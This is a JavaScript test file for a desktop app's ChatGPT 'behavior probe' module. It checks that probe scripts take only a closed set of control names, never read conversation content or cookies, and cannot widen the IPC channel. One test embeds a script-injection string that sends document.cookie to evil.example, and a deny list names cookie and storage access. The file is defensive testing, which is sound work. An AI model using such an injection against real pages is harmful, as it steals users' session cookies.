import { readDesktopIPCSource } from '../../composition/ipc/source.mjs'
import test from 'node:test'
import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import {
  BEHAVIOR_PROBE_CONTROLS,
  BEHAVIOR_PROBE_SCHEMA,
  behaviorProbeScript,
  isBehaviorProbeEnabled,
  normalizeBehaviorProbeResult,
  sanitizeBehaviorProbeControl,
} from './chatgpt-behavior-probe.mjs'

test('the probe vocabulary is closed', () => {
  for (const control of BEHAVIOR_PROBE_CONTROLS) {
    assert.equal(sanitizeBehaviorProbeControl(control), control)
  }
  for (const rejected of ['', 'composer', 'assistant-turn', 'MENU-ITEMS', 'menu-items;drop', undefined, null, 42]) {
    assert.throws(() => sanitizeBehaviorProbeControl(rejected), /Unknown behavior probe control/)
  }
  // Surrounding whitespace is trimmed deliberately; the name still has to be an
  // exact member of the enum afterwards.
  assert.equal(sanitizeBehaviorProbeControl('  menu-items  '), 'menu-items')
})

test('reasoning-effort probe is confined to the active composer chrome', () => {
  const script = behaviorProbeScript('reasoning-effort')
  assert.match(script, /prompt-textarea/)
  assert.match(script, /closest\('\[data-composer-surface\]'\)/)
  assert.match(script, /closest\('form\[data-chatgpt-composer\]'\)/)
  assert.match(script, /button\[aria-haspopup="menu"\]:not\(\[data-testid\]\)/)
  assert.doesNotMatch(script, /data-message-author-role|conversation-turn|\.click\(/)
})

// The whole point of the closed enum is that nothing the caller says can reach
// the page. A probe that interpolated its argument would be an arbitrary-script
// capability wearing an enum's clothes.
test('no caller string reaches the page', () => {
  const injection = `'); fetch('https://evil.example/'+document.cookie); ('`
  assert.throws(() => behaviorProbeScript(injection), /Unknown behavior probe control/)
  for (const control of BEHAVIOR_PROBE_CONTROLS) {
    const script = behaviorProbeScript(control)
    assert.ok(!script.includes(injection))
    // The control name is the only caller-derived value, and it appears only as
    // a literal the module itself wrote.
    assert.match(script, /^\(\(\) => \{/)
    assert.match(script, /\}\)\(\)$/)
  }
})

test('probe scripts never read conversation or assistant content', () => {
  for (const control of BEHAVIOR_PROBE_CONTROLS) {
    const script = behaviorProbeScript(control)
    for (const forbidden of [
      'data-message-author-role',
      'assistant',
      'markdown',
      'document.cookie',
      'localStorage',
      'sessionStorage',
      'innerHTML',
      'outerHTML',
      'fetch(',
      'XMLHttpRequest',
      'conversation-turn',
    ]) {
      assert.ok(!script.includes(forbidden), `${control} probe must not reference ${forbidden}`)
    }
    // Probes observe. They never activate anything.
    assert.ok(!/\.click\(\)/.test(script), `${control} probe must not click`)
    assert.ok(!/location\s*=/.test(script), `${control} probe must not navigate`)
  }
})

test('the probe is inert unless explicitly enabled', () => {
  assert.equal(isBehaviorProbeEnabled({}), false)
  assert.equal(isBehaviorProbeEnabled({ WHARNESS_BEHAVIOR_PROBE: '' }), false)
  assert.equal(isBehaviorProbeEnabled({ WHARNESS_BEHAVIOR_PROBE: '0' }), false)
  assert.equal(isBehaviorProbeEnabled({ WHARNESS_BEHAVIOR_PROBE: 'true' }), false)
  assert.equal(isBehaviorProbeEnabled({ WHARNESS_BEHAVIOR_PROBE: '1' }), true)
})

// A page is untrusted: it can return whatever it likes from the probe script.
// Re-bounding in the main process is what stops that from widening the IPC.
test('a result is re-bounded before it crosses IPC', () => {
  const hostile = {
    control: 'menu-items',
    viewport: { w: 1280, h: 900 },
    total: 7,
    labels: Array.from({ length: 50 }, (_, index) => ({
      label: 'x'.repeat(500),
      testid: 'item-' + index,
      href: '/c/secret-conversation-id',
      prose: 'the assistant said something confidential',
    })),
    cookies: 'session=abc',
    nested: { deep: 'value' },
  }
  const result = normalizeBehaviorProbeResult('menu-items', hostile)

  assert.equal(result.schema, BEHAVIOR_PROBE_SCHEMA)
  assert.equal(result.control, 'menu-items')
  assert.deepEqual(result.viewport, { w: 1280, h: 900 })
  assert.equal(result.total, 7)
  assert.equal(result.labels.length, 16)
  assert.equal(result.labels[0].label.length, 120)

  // Anything not on the allowlist is dropped outright.
  assert.equal(result.cookies, undefined)
  assert.equal(result.nested, undefined)
  for (const item of result.labels) {
    assert.equal(item.href, undefined)
    assert.equal(item.prose, undefined)
  }
  assert.ok(!JSON.stringify(result).includes('confidential'))
  assert.ok(!JSON.stringify(result).includes('session=abc'))
})

test('a missing viewport is reported rather than assumed', () => {
  const result = normalizeBehaviorProbeResult('project-dialog', { dialogs: 0 })
  assert.deepEqual(result.viewport, { w: -1, h: -1 })
  assert.equal(result.dialogs, 0)
})

test('the IPC handler is gated, owned, origin-checked and never plan-reachable', async () => {
  const [main, probeIPC, preload] = await Promise.all([
    readDesktopIPCSource(),
    readFile(new URL('../session/ipc/probes.mjs', import.meta.url), 'utf8'),
    readFile(new URL('../../preload.cjs', import.meta.url), 'utf8'),
  ])
  assert.match(main, /registerChatGPTAccountIPC\(\{/)
  const start = probeIPC.indexOf("ipcMain.handle('wharness:chatgpt:probe-behavior'")
  assert.ok(start > 0, 'the probe handler must exist')
  const handler = probeIPC.slice(start, probeIPC.indexOf('\n  })', start))

  assert.match(handler, /trustedSender\(event\)/)
  assert.match(handler, /isBehaviorProbeEnabled\(\)/)
  assert.match(handler, /sanitizeBehaviorProbeControl\(request\?\.control\)/)
  assert.match(handler, /requireOwnedChatGPTEntry\(key, entry\)/)
  assert.match(handler, /isTrustedChatGPTOrigin/)
  assert.match(handler, /normalizeBehaviorProbeResult\(control, raw\)/)
  // The gate must run before the control is resolved or any view is touched.
  assert.ok(handler.indexOf('isBehaviorProbeEnabled') < handler.indexOf('ensureChatGPTView'))

  // The preload exposes a named capability bound to a literal channel. A generic
  // passthrough here would defeat every gate in the handler above.
  assert.match(preload, /probeBehavior: \(cacheKey, control\) => invoke\('wharness:chatgpt:probe-behavior'/)
  const exposed = preload.slice(preload.indexOf('exposeInMainWorld'))
  // AGENTS.md §8: narrow, NAMED capabilities - never `ipcRenderer` itself and
  // never a generic send/invoke primitive the caller can point anywhere.
  assert.doesNotMatch(exposed, /:\s*(invoke|ipcRenderer)\s*[,}]/, 'the preload must not expose invoke or ipcRenderer as a value')
  const channels = [...exposed.matchAll(/(?:invoke|ipcRenderer\.(?:on|removeListener|send))\(([^,)]+)/g)]
  assert.ok(channels.length > 20, 'expected the exposed surface to be enumerated')
  for (const [, channel] of channels) {
    // `wharness:` is the shipped channel namespace; new channels use the canonical `wharnex:` (AGENTS.md §4).
    assert.match(channel.trim(), /^'wharne(?:ss|x):[a-z-]+:[a-z-]+'$/, `channel ${channel.trim()} must be a string literal`)
  }
})
